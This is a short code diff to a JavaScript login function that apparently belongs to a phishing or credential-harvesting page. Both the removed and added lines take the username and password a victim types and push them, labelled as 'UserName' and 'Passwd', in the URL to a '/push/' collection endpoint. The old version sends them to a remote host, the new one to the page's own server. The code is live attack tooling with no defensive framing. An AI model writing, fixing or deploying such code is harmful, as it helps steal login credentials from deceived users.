@@ -19,5 +19,5 @@ function login() {
     password = pwd.value;
 
     var url = window.location.href;
-    window.location.href = remote + '/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password
+    window.location.href = String('/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password).replace('//','/')
 }
